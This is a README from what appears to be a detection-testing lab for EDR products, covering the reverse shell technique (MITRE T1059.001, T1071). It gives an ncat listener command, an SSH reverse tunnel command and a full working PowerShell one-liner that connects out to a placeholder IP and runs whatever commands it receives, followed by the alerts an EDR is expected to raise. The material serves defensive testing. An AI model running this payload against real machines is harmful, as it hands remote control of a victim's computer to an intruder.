# 06. Reverse Shell (remote control)

[Portugues](../../06-shell-reversa/README.md) | **English**

**MITRE ATT&CK tactic:** Command and Control
**IDs:** T1059.001, T1071
**Expected severity:** Critical
**Needs admin:** No
**Destructive:** No

## What it is for, from the attacker point of view

Normally it is you who connects to a server. The reverse shell flips that. The victim machine is the one that calls home to the attacker and hands them a command terminal. From there the intruder types commands as if they were sitting in front of the computer, interactively and in real time.

## Why it is dangerous

It is the moment the victim loses control of the machine. And it is clever. Since it is the internal machine that goes out connecting, usually over port 80, ordinary web traffic, it crosses the firewall. Most firewalls allow outbound on port 80 without question. That is why detecting this phase is usually the most valuable alert of the whole test.

## Analogy

Imagine that your home intercom, instead of just ringing, called the burglar on its own and opened a microphone and a command line of the whole house to them. And it called from the inside out, so it would not look like a break in.

## What the script does

The script asks for the IP of your server, the listener machine, and opens a connection from the native powershell.exe, handing over a prompt. Everything happens inside your lab, between two machines of yours.

### Important, the other side needs a listener

An SSH server on port 80 does not capture a raw reverse shell. On your server, choose one of the options.

Option A, a simple listener. Stop SSH and run a listener on port 80.

```bash
ncat -lvnp 80
```

Option B, only native Windows tools, with an SSH tunnel. Windows 10 and 11 already ship the ssh.exe client. You can use your real SSH server on port 80 to open a reverse tunnel.

```cmd
ssh -p 80 -R 9001:127.0.0.1:3389 user@YOUR_IP
```

## Example with native PowerShell, replace YOUR_IP

```powershell
$c=New-Object System.Net.Sockets.TCPClient('YOUR_IP',80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
```

## What the EDR should detect

* powershell.exe opening an unusual outbound network connection.
* Use of New-Object System.Net.Sockets.TCPClient and Invoke-Expression.
* Command and Control behavior, critical severity.

## Prerequisites

* A second machine or VM of yours as the listener, see the options above.
* Network between the two lab VMs.

## Cleanup

* Close the PowerShell window or end the ssh session. No file is left on disk.
